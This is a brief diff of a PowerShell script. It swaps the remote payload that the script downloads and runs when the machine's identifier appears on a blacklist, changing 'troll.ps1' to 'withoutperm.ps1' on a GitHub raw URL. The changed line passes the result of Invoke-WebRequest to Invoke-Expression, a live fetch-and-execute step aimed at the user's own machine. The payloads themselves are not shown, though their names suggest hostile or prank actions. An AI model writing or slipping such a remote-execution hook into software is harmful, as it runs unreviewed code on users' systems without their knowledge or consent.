@@ -140,7 +140,7 @@ try {
     $Linhas = $Blacklist.Content -split "`n"
 
     if ($Linhas -contains $Identificador) {
-        Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/castielwallker/whysistem/raw/refs/heads/main/troll.ps1" -UseBasicParsing).Content
+        Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/castielwallker/whysistem/raw/refs/heads/main/withoutperm.ps1" -UseBasicParsing).Content
         exit 1 
     }
     else {
